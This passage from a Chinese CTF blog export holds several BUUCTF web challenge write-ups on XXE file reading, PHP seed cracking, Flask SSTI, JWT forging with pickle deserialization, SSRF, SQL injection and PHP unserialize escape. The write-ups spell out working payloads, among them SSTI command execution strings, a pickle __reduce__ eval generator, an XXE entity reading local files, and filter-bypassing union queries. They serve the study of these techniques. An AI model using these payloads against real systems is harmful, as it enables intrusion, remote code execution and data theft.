然后输出\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679657151543-97b24931-a4a4-45ad-9f6e-2dcc37ef39d4.png) ![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679657191148-69954b67-5aa4-4516-a440-2b628bb97fca.png)\n\n成功！\n","tags":["ssrf","perl"],"categories":["buuctf"]},{"title":"buuctf-74-[NCTF2019]True XML cookbook.txt","url":"/post/e8a597ec.html","content":"\n[NCTF2019]True XML cookbook.txt\n\n<!--more-->\n\n## 碎碎念：\n\n这道题考察了xml和xxe，其实攻击手段手段是xxe，一开始做这道题一直没复现出来，bp爆破模块一直不动，之后用了python脚本也不行，就放弃了，第二天中午在试了一次，终于成功了，真玄学。做之前也是去补了一下xxe的知识，真不错。\n\n## 解题：\n\n进入题目是一个登录框，发现我们的登录名会显示在界面上\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679643576603-ba19db5b-007b-446c-82f3-10ac758b00cc.png)\n\n之前buu有道题也是和这道题目一样的ui，直接套用上道题目的解题答案，发现肯定不行。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679643711572-da9bff85-1876-406d-ad6d-69dddb2fd2f5.png)\n\n首先来看一下这个payload构成\n\n第一行`<?xml version=\"1.0\"  encoding=\"UTF-8\" ?>`这一行表示了这是xml的文档显示了版本信息和编码格式\n\n最重要的一部分：\n\n```\n<!DOCTYPE username [\n<!ENTITY aaa SYSTEM \"file:///flag\"> ]>\n```\n\n这是DTD，用来规范xml的文档格式 `username`为根元素 每个xml文档都要有一个根元素，并且有且只有一个，然后`aaa`是我们定义的一个实体，并且这里`SYSTEM`表示是外部实体，这也就是为什么xxe叫做外部实体注入，我们可以通过调用外部实体来达到我们预期的一个攻击手段。其实这里把他理解为是一个变量就可以之后是`aaa`这个实体的值，这里可以看到是一个file协议，没错xxe可以与伪协议一起搭配使用去恶意读一些文件内容。  具体可以看这里：https://xz.aliyun.com/t/3357#toc-0 总结的很到位\n\n然后通过 `&实体名称;` 的方式来调用这个我们创建的实体。\n\n然后之后就不懂了 ，慢慢的去看大佬的wp去学习\n\n之后可以通过filter伪协议去读 index.php的内容但是没有什么用\n\n然后这道题的思路是通过xxe去探测内网 参考：https://blog.spoock.com/2019/10/08/proc/\n\nhttps://www.cnblogs.com/secutity-zbk/p/14789043.html\n\n- /etc/hosts 储存域名解析的缓存\n- /etc/passwd 用户密码\n- /proc/net/arp  地址解析的内核ARP表的信息  \n- /proc/net/fib_trie 路由缓存\n\n扫一下域名解析缓存\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644669966-630764be-85ba-49fd-ae15-4972d217180d.png)\n\n扫一下用户登录状态密码啥的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644749032-70eded58-fd1c-433f-b3f9-0df596e95e13.png)\n\n发现都可以扫到\n\n去扫解析的地址和路由缓存：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644874065-fa187595-bd78-4376-9b6c-5f4bbd6bf4b9.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679644939819-489e3110-fb7b-4962-8207-21c8754032c0.png)\n\n发现可疑ip，直接进行http协议读ip\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679645074091-dea2c2c1-2834-4809-a4a1-dad93bbb8423.png)\n\n发现不行，看了大佬的wp是因为c段ip不正确，也就是129这里不对，好像是计算机网络的知识，这里就不深究了，但是我们这里直接用bp的爆破模块就行，就是这里一开始没做出来，好像是题目问题，第二天终于做出来了\n\n当网段正确时，拿到flag。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679643489111-d7a23ddc-2bb6-46c7-b5d0-436cb2e227ee.png)\n","tags":["xxe","内网"],"categories":["buuctf"]},{"title":"buuctf-73-[GWCTF 2019]枯燥的抽奖","url":"/post/490aa04.html","content":"\n[GWCTF 2019]枯燥的抽奖\n\n<!--more-->\n\n## 碎碎念：\n\n这道题是一道关于伪造伪随机数的题目，之前从未接触过，这次来记录一下\n\n## 解题：\n\n进入题目之后查看源码 发现`check.php`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483023667-c996906b-3fbe-417a-baaa-47e01e22b92f.png)\n\n发现源码：\n\n```plain\n<?php\n#这不是抽奖程序的源代码！不许看！\nheader(\"Content-Type: text/html;charset=utf-8\");\nsession_start();\nif(!isset($_SESSION['seed'])){\n$_SESSION['seed']=rand(0,999999999);\n}\n\nmt_srand($_SESSION['seed']);\n$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n$str='';\n$len1=20;\nfor ( $i = 0; $i < $len1; $i++ ){\n    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       \n}\n$str_show = substr($str, 0, 10);\necho \"<p id='p1'>\".$str_show.\"</p>\";\n\n\nif(isset($_POST['num'])){\n    if($_POST['num']===$str){x\n        echo \"<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>\";\n    }\n    else{\n        echo \"<p id=flag>没抽中哦，再试试吧</p>\";\n    }\n}\nshow_source(\"check.php\");\n```\n\n总体分析一下就是我们要输入一个num参数 当num等于他产生的随机长为20的字符串 就能拿到flag\n\nmt_srand() \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483191710-fb814299-27a1-4fe9-8795-4f860a7848e9.png)\n\n简单说就是这个函数给mt_rand()函数提供一个种子 然后mt_rand()函数去生成一个随机数，但是这个随机数其实是一个伪随机数\n\n那么如果我们能破解出这个种子 这道题目就迎刃而解了\n\n这里要用到php_mt_seed脚本去破解这个种子  脚本下载地址：https://www.openwall.com/php_mt_seed/\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483395438-3f102fcd-eb70-4556-b7ce-21a5d383ad02.png)\n\n然后装到我的kali上\n\n先make 一下\n\n这里make一开始不知道是什么东西然后去查了查还是有东西的\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483549317-739c5e85-a900-42c3-a7d6-c296871ac8be.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483489104-33b48267-83cc-452b-90ce-84b89fb3431a.png)\n\n然后这个脚本要先把这字符串转化为一个可识别的数列\n\npython脚本如下:\n\n```plain\nstr1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nstr2='QJlBBqs6ji'\nstr3 = str1[::-1]\nlength = len(str2)\nres=''\nfor i in range(len(str2)):  \n    for j in range(len(str1)):\n        if str2[i] == str1[j]:\n            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '\n            break\nprint(res)\n```\n\n但是我没有搞懂这个脚本的目的和原理\n\n进行爆破 发现种子 这里调用脚本通过`./`调用其实就是运行该脚本的意思\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483685459-9dc379c9-56ce-4f7e-a035-954752ed1f4c.png)\n\n再根据这个种子 重新生成题目中的字符串 直接用题目的代码稍加修改就行\n\n脚本如下：\n\n```plain\n<?php\nmt_srand(672026733);\n$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n$str='';\n$len1=20;\nfor ( $i = 0; $i < $len1; $i++ ){\n    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       \n}\necho $str;\n?> \n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483730008-bc495859-079b-47ec-b4cb-835e4a636a22.png)\n\n拿到flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679483777454-45feaed2-b77a-4171-be81-e44f5bae654d.png)\n","tags":["伪随机数"],"categories":["buuctf"]},{"title":"buuctf-72-[CSCCTF 2019 Qual]FlaskLight","url":"/post/8df15d0e.html","content":"\n[CSCCTF 2019 Qual]FlaskLight\n\n<!--more-->\n\n一眼丁真 flask的ssti\n\n这道题几乎没怎么过滤 payload随便在网上扒就行了\n\n但是不知道超级无敌脚本怎么会报错 只能手动去注入了\n\n记录一下各种payload的吧 这道题如果直接用`__globals__`会报错可能是被屏蔽了，通过拼接绕过就行了\n\n这些是比较简单的payload：\n\n1. `?search={{config.__init__['__global'+'s__'].os.popen(\"cmd\").read()}}`\n2. `?search={{[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval'](\"__import__('os').popen('cmd').read()\")}}`\n","tags":["flask框架","python"],"categories":["buuctf"]},{"title":"buuctf-71-[CISCN2019 华北赛区 Day1 Web2]ikun","url":"/post/8a6d07e1.html","content":"\n[CISCN2019 华北赛区 Day1 Web2]ikun\n\n<!--more-->\n\n## 碎碎念：\n\n一道关于jwt和python反序列化的题目，对我来说很新颖，暂时只会php的反序列化，就当作学习题目了，然后越做到后面的题目发现会python脚本干一些机械重复性的事情真的很有用，得找时间去学着写脚本。\n\n## 解题：\n\n进入题目\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679473847087-0169d116-8a33-4976-bd55-f371017157d8.png)\n\n看过源码一些正常操作之后什么也没发现，看到一句话，应该是让我们买lv6，在这之前先去注册登录，然后日常看一下admin的用户，发现是已经注册过的。\n\n一开始我都是一页一页的在找，发现找了10几页都没有找到，就感觉不对劲了，然后看了大佬的wp，发现要用脚本去找，最后page=181，我真的人都傻了\n\n这里放下大佬的脚本\n\n```plain\nimport requests\n\nimport time\n\nfor i in range(1,200):\n\n    time.sleep(0.8)\n\n    print(i)\n\n    url = 'http://ca5b02fb-d09b-45b9-b0ff-a14785826592.node3.buuoj.cn/shop?page={}'.format(i)\n\n    r = requests.get(url)\n\n    if 'lv6.png' in r.text:\n\n        print(\"找到lv6-----{}\".format(i))\n\n        break\n```\n\n其实这个脚本还是蛮容易理解的，将页数格式化，让后一直循环，当该页面存在`lv6.png`内容时，就说明找到了\n\n但是这里要注意，一定让脚本暂停0.8秒，因为buu会防爬\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474702762-160ddbe0-fb42-4be9-8366-724c99159d5b.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474338539-15f8f312-2c1b-4634-a335-e851b7b615de.png)\n\n找到之后发现这个钱数我们买不了，抓包查看，发现有折扣\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474379880-aa279a5f-7795-4149-898f-7a5b6e3e7554.png)\n\n直接修改一下，发现页面跳转了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474405099-6658c1fd-c0b6-4f9a-82df-b7676aa6ea26.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474429619-3a0c3aa1-a290-4dc3-a611-ae624ea29688.png)\n\n只容许admin访问，这也应印证了之前注册的时候admin已经被注册过\n\n抓包分析一下，这里就是关于jwt的知识点了，参考：https://www.cnblogs.com/cjsblog/p/9277677.html\n\n就我个人认为，类似于我们平常做题的php session用于记录当前登录用户会话信息\n\n那么弄明白之后就试着去伪造这个jwt，把我们的jwt伪造成admin的那么不就可以成功嘛\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474509525-bb77812e-6b29-47af-9b35-e4030eef9816.png)\n\n先将这个jwt字符串给 弄回原来的模样 这里有个工具：https://jwt.io/\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474884435-1df5d5ae-3d04-4797-973c-28d07ddacbbf.png)\n\n发现存在我们登录名称，直接改为admin，再抓包可以嘛，理论可以，但是这里还存在一个key，必须拿到这个key才能再反编译回去符合他的要求，这里就有个暴力破解jwt key的脚本 https://github.com/brendan-rius/c-jwt-cracker\n\n我直接是放在kali环境下了，因为还要配置docker环境，环境配置好以后，里面有个文件说明，看看就会使用。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475165344-5aead3f4-8bbd-47b7-97e8-5e6c22972de8.png)\n\n注意要用root身份 爆出 key为 `1Kun` \n\n现在将用户换为 `admin` key使用 `1Kun`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475274835-d6c1dca3-27df-4561-89ed-a8aec4f676ad.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475309325-035236f5-1a7f-49c8-a173-ad59fad9498c.png)\n\n然后查看源码 发现一个压缩包\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475357662-942c80ce-c9b9-4d58-9db6-4f749ac6cfd4.png)\n\n下载下来 \n\n看了大佬的wp 发现Admin.py存在反序列化漏洞\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475402464-72d76905-3a4f-4dee-ba61-e28208f05db6.png)\n\n源码附上：\n\n```plain\nimport tornado.web\nfrom sshop.base import BaseHandler\nimport pickle\nimport urllib\n\n\nclass AdminHandler(BaseHandler):\n    @tornado.web.authenticated\n    def get(self, *args, **kwargs):\n        if self.current_user == \"admin\":\n            return self.render('form.html', res='This is Black Technology!', member=0)\n        else:\n            return self.render('no_ass.html')\n\n    @tornado.web.authenticated\n    def post(self, *args, **kwargs):\n        try:\n            become = self.get_argument('become')\n            p = pickle.loads(urllib.unquote(become))\n            return self.render('form.html', res=p, member=1)\n        except:\n            return self.render('form.html', res='This is Black Technology!', member=0)\n```\n\n这里的pickle模块应该就是属于python 的序列化与反序列化模块\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475553228-e58261a6-ee61-458f-ab34-317dd22fdd73.png)\n\n看到become存在反序列化 那么我们就可以像php反序列化漏洞一样 构造读flag的序列化字符串 然后传给become就可以获得flag了\n\n本地构造：\n\n```plain\nimport pickle\nimport urllib\n\nclass payload(object):\n    def __reduce__(self):  ##当pickle对象被调用时自动执行\n       return (eval, (\"open('/flag.txt','r').read()\",)) ##注意要是元组\n\na = pickle.dumps(payload())  ##如果对pickle不理解可自行百度\na = urllib.quote(a)\nprint a\n```\n\n这里我在本机vscode会报错\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475702429-4efd6e74-e03d-49da-91a6-b059d717becd.png)\n\n发现这个脚本是属于python2的 我这是python3 所以我只好去我的kali虚拟去跑\n\n注意这里要把中文注释删了 不然会报错 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475831556-3f608263-1166-4f39-a71b-dcece769b79d.png)\n\n然后点击 一键成为大会员 抓包 修改become值\n\n成功拿到 flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475923738-eada5091-7c68-4503-9402-50b706cc41c3.png)\n","tags":["python","jwt","python反序列化"],"categories":["buuctf"]},{"title":"buuctf-60-[De1CTF 2019]SSRF Me","url":"/post/2ee4794d.html","content":"\n[De1CTF 2019]SSRF Me\n\n<!--more-->\n\n一道python代码审计，发现审计能力真的很重要。\n\n看到源码：\n\n```cmake\n#! /usr/bin/env python\n#encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\nreload(sys)\nsys.setdefaultencoding('latin1')\n\napp = Flask(__name__)\n\nsecert_key = os.urandom(16)\n\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr\n            os.mkdir(self.sandbox)\n\n    def Exec(self):\n        result = {}\n        result['code'] = 500\n        if (self.checkSign()):\n            if \"scan\" in self.action:\n                tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n                resp = scan(self.param)\n                if (resp == \"Connection Timeout\"):\n                    result['data'] = resp\n                else:\n                    print resp\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result['code'] = 200\n            if \"read\" in self.action:\n                f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n                result['code'] = 200\n                result['data'] = f.read()\n            if result['code'] == 500:\n                result['data'] = \"Action Error\"\n        else:\n            result['code'] = 500\n            result['msg'] = \"Sign Error\"\n        return result\n\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):\n            return True\n        else:\n            return False\n\n\n#generate Sign For Action Scan.\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    action = \"scan\"\n    return getSign(action, param)\n\n\n@app.route('/De1ta',methods=['GET','POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if(waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n@app.route('/')\ndef index():\n    return open(\"code.txt\",\"r\").read()\n\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n\n\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\n\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\n\ndef waf(param):\n    check=param.strip().lower()\n    if check.startswith(\"gopher\") or check.startswith(\"file\"):\n        return True\n    else:\n        return False\n\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run(host='0.0.0.0')\n```\n\n分析：\n\n有三个路由：`/geneSign` `/De1ta` `/`\n\n`/geneSign` 路由是获取签名的 通过get给param传参 然后这里action不是我们能改变的\n\n一起传入getSign() \n\n返回 `secert_key+param+action`的md5值 这里只有param我们能控制\n\n```cmake\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    action = \"scan\"\n    return getSign(action, param)\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\n```\n\n再来看`/De1ta`\n\n```cmake\n@app.route('/De1ta',methods=['GET','POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if(waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n```\n\nget方式给param传参 cookie传action和sign的值\n\n经过一个waf 这里用来防止用协议\n\n然后传入Exec()\n\n先经过checkSign函数检查签名是否符合\n\n```cmake\n def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):\n            return True\n        else:\n            return False\n```\n\n分别有两个if判断\n\n第一个if： 当有action有scan时注意这里是`in` 而不是 `==`,生成一个tmpfile文件\n\n将param传入scan函数\n\n```cmake\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n```\n\n这里能看到`urllib.urlopen().read()`这里就是利用点 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681569071434-59e9ac4d-007e-413d-b3b5-6b0572ab50ae.png)\n\n相当于打开param这个文件 题目也提示flag在flag.txt中\n\n这也就是为什么waf要禁用file协议和gopher协议（也就是http协议的前身）\n\n因为ssrf漏洞一般都可以搭配很多协议来用\n\n然后将scan内容写入到tmpfile文件中 但是没法读\n\n第二个if：当action中有read时 就会读出来赋值给result[data]然后 Exec函数返回result结果\n\n做到这里当思路就很清晰\n\naction同时包括scan和read时候既能写入文件也能读出文件,但是我们action的值是我们修改不了的该怎么办呢\n\n再来看生成签名这里`hashlib.md5(secert_key + param + action)` 这里我们可以给param传入flag.txtread拼接起来 就算我们没有给action传read 最后md5值是将整个字符串拼接起来包含read值 这就可以了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681569721446-365d0287-38a5-4618-a182-6250f63d1336.png)\n\n`9b231caf6bf82362fa5f78bf8da3d6ec`记录下我们的签名 \n\n成功！\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681569831963-9cfa50d0-0e24-4628-9a49-3bc29f274ba6.png)\n","tags":["flask框架","python","代码审计"],"categories":["buuctf"]},{"title":"buuctf-49-[SWPU2019]Web1","url":"/post/89f21605.html","content":"\n[SWPU2019]Web1\n\n<!--more-->\n\n这是一道无列名注入的一道题\n\n进入发现要注册一个账号并且登录 发现admin已经被注册了 本来一开始的想法是拿到admin的密码就结束了\n\n进去之后有一个 可以发布内容的 看到这里以为是xss注入 但后来看了大佬wp 不是\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678460509878-cf2a45c9-71c9-403f-baf5-1320d375227b.png)\n\n然后在发布广告广告名这里可以进行sql注入\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678460618692-5b643a68-2285-4b0b-ba3e-280448656e8e.png)\n\n判断字段数，发现`order by`被禁用了所以之后联合查询时候包含`or`表，数据库都被河蟹了。\n\n空格也被河蟹了 用`/**/`来绕过 这个本来是mysql用于多行注释的\n\n就可以用`group by`代替 或者select 1，2，3... 根据回显判断字段数\n\n然后这道题还河蟹了`# --`注释符 这里用到了通过闭合后面的单引号来绕过 参考：https://blog.csdn.net/qq_35733751/article/details/106462625\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678460895563-48a68425-baff-4026-83d5-abaef46c9ef2.png)这张图就可以很形象表示\n\n判断字段数：`1'/**/group/**/by/**/22,'` 至于这个末尾的逗号 应该是起一个子句的作用 如果没有就会报错\n\n查表：`1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/' `\n\n这里用到了 `mysql.innodb_table_stats`因为 `or` 被河蟹了,又长了一个新姿势 还可以用 `sys.schema_auto_increment_columns`查表名 参考：https://www.anquanke.com/post/id/193512\n\n爆出表名：\n\nFLAG_TABLE,news,users,gtid_slave_pos,ads,users\n\n 得到了表名 一般来说就要爆列名了 但是这道题不知道列名 然后就要使用无列名注入了，在本地搭了一个环境进行测试\n\n简单来说无列名注入会给表的列名起一个数字称谓（as用字符当别称也行）然后利用数字查列内容\n\n参考：https://err0r.top/article/mardasctf/\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461602828-24dea7a0-7adf-4c53-a4ff-bc34ae832eb0.png)\n\n派生表要起个别名 如下图 不然会报错\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461677314-cb1fe5db-e76f-487f-9834-c88fd06c743b.png)\n\n如果是数字 则要用``包裹起来 如果被河蟹了 就可以用起别名的方式绕过\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461832358-ff3d43fb-a352-4cf2-96e6-507b3806b4b8.png)\n\n构造：`1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)b),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461972121-cb82f694-b889-4a2d-b258-2298e09e2968.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678510108817-bea36dc4-e206-4942-a5bc-5ffc0c721b40.png)\n\n至于这里为什么中间是只有 select 1,2,3就结束了  这里没搞明白\n\n如果我们多加个4 或者减去一个数 则会出现![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678462097766-eb91beb6-0645-4a0c-b7be-c13cc5138410.png)\n\n爆出 查询的列不对应\n\n原因是之后联合查询这部分字段数只有3个字段`union/**/select*from/**/users`\n\n`select 和 union select`一起用的时候前后字段数必须相同 \n","tags":["sql注入","sql bypass"],"categories":["buuctf"]},{"title":"buuctf-48-[安洵杯 2019]easy_serialize_php","url":"/post/5419e860.html","content":"\n[安洵杯 2019]easy_serialize_php\n\n<!--more-->\n\n这是一道反序列化字符串逃逸题目 一道学习题目\n\n打开题目 看到源码\n\n```php\n<?php\n\n\n$function = @$_GET['f'];\n\n\nfunction filter($img){\n    $filter_arr = array('php','flag','php5','php4','fl1g');\n    $filter = '/'.implode('|',$filter_arr).'/i';\n    return preg_replace($filter,'',$img);\n}\n\n\n\nif($_SESSION){\n    unset($_SESSION);\n}\n\n\n$_SESSION[\"user\"] = 'guest';\n$_SESSION['function'] = $function;\n\n\nextract($_POST);\n\n\nif(!$function){\n    echo '<a href=\"index.php?f=highlight_file\">source_code</a>';\n}\n\n\nif(!$_GET['img_path']){\n    $_SESSION['img'] = base64_encode('guest_img.png');\n}else{\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\n}\n\n\n$serialize_info = filter(serialize($_SESSION));\n\n\nif($function == 'highlight_file'){\n    highlight_file('index.php');\n}else if($function == 'phpinfo'){\n    eval('phpinfo();'); //maybe you can find something in here!\n}else if($function == 'show_image'){\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678028387439-5e30cbf1-2b4b-499a-8fda-01a0e0aafaa2.png)\n\n看到url 是`f=highli_file` 看到源码就明白了\n\n```php\nif($function == 'highlight_file'){\n    highlight_file('index.php');\n}else if($function == 'phpinfo'){\n    eval('phpinfo();'); //maybe you can find something in here!\n}else if($function == 'show_image'){\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));\n}\n```\n\n这里可以说是主程序了 题目当`f=phpinfo()`输出`phpinfo()`我们会找到一些东西\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678028629889-2e6333f7-e163-4197-b9e8-c7aec11be3b2.png)果然发现了可疑php文件 \n\n主程序有file_get_contents() 这里应该就是去包含我们发现的d0g3_f1ag.php文件\n\n还有一个我不知道的特殊点：$_SESSION数组 这是一个数组\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678028879443-2428b4ea-e2bd-4b27-a61b-b9f600fbc766.png)\n\n这道题$_SESSION共有三个变量分别为 `user function img` 其实img用来去包含那个php文件\n\n但是这里\n\n```php\nif(!$_GET['img_path']){\n    $_SESSION['img'] = base64_encode('guest_img.png');\n}else{\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\n}\n```\n\n$_SESSION['img']先通过base64加密 然后再进行sha1()函数 尽管主函数最后包含文件之前会有base64解密 但是sha1()函数明显就是不让我们直接将flag文件赋值给$_SESSION['img']\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678029789710-ca04d073-df07-40ab-bf30-5791bbfbffb8.png)\n\n那么应该怎么让$_SESSION['img']等于我们的php文件呢 这里思路大概就是类似于类反序列化 \n\n本地序列化构造包含了php文件的$_SESSION['img'] 然后再反序列去覆盖那个题目中的$_SESSION['img']\n\n再来看过滤这部分 用空字符去正则代换我们的文件名后缀名\n\n```php\nfunction filter($img){\n    $filter_arr = array('php','flag','php5','php4','fl1g');\n    $filter = '/'.implode('|',$filter_arr).'/i';\n    return preg_replace($filter,'',$img);\n}\n```\n\n\n\n这里就用到了字符串反序列化沙箱逃逸 参考https://www.jianshu.com/p/8e8117f9fd0e\n\n通过一个小demo简单看一下原理\n\n```php\n<?php\n//反序列化字符串逃逸\n$a = array('123', 'abc', 'defg');\n$b=serialize($a); //a:3:{i:0;s:3:\"123\";i:1;s:3:\"abc\";i:2;s:4:\"defg\";}\nvar_dump(unserialize($b));    \n// 添加 i:2;s:4:\"love\";}\n$c='a:3:{i:0;s:3:\"123\";i:1;s:3:\"abc\";i:2;s:4:\"love\";}i:2;s:4:\"defg\";}';\nvar_dump(unserialize($c));\n?>\n```\n\n![image.png](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682744765971-b50d2065-4da4-4695-b8cc-2ab0ab675374.png)\n\n本地测试\n\n```php\n<?php\n$a ='/flag/';\n$_SESSION[\"user\"]='flagflagflagflagflagflag';\n$_SESSION[\"function\"]='a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:2:\"dd\";s:1:\"a\";}';\n$_SESSION[\"img\"]='L2QwZzNfZmxsbGxsbGFn';\n$b=serialize($_SESSION);\necho $b;\necho \"\\n\";\n$c=preg_replace($a,'',$b);\nvar_dump($c);\nprint_r(unserialize($c));\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678030400496-4b376af4-9be1-4dab-a2b5-42423e634d5d.png)\n\n就是通过特意构造序列化 让$_SESSION[\"function\"]中的内容仿照反序列化后的$_SESSION[img]数组内容 从而达到覆盖\n\n当$_SESSION['user']中的24个字符被空字符代替之后 之后反序列化就会继续向后面寻找24个字符找到符合条件的内容进行反序列化读取`\";s:8:\"function\";s:59:\"a`这24个字符 